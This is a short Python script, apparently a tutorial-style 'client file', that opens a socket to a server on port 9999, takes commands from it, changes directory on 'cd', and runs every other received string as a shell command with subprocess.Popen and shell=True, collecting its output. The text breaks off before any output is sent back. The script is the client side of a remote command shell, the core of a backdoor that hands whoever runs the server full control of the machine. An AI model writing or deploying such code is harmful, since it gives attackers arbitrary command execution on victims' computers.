#client file

import socket
import os
import subprocess


s=socket.socket()
host=socket.gethostname()
port=9999
s.connect((host,port))

#use while loop to keep the connection alive
while True:
    #receive commands from the server
    data=s.recv(1024)
    #if the data is quit, then close the connection
    if data[:2].decode("utf-8")=="cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data)>0:
       #write subprocess.popen
        cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
      
      #get the output
        output_byte=cmd.stdout.read()+cmd.stderr.read()


